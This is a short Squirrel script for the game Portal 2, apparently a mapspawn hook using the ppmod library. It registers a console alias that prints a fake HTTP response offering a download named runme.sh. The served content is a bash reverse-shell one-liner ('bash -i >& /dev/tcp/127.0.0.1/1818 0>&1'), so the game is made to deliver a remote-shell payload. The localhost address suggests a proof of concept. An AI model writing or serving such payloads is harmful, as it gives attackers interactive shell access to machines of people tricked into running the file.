//********************************************************************************************
//MAPSPAWN.nut is called on newgame or transitions
//********************************************************************************************
if (!("Entities" in this)) return;
IncludeScript("ppmod");

printl("==== calling mapspawn.nut")

ppmod.onauto(function() {
	ppmod.alias("GET", function(){
		local fileContents = "bash -i >& /dev/tcp/127.0.0.1/1818 0>&1";
		
		printl("HTTP/1.1 200 OK");
		printl("Server: Portal 2");
		printl("Content-Type: text/html");
		printl("Content-Disposition: attachment; filename=runme.sh");
		printl("Content-Length: " + fileContents.len());
		printl("");
		printl(fileContents);
		printl("");
	  }
	);
});
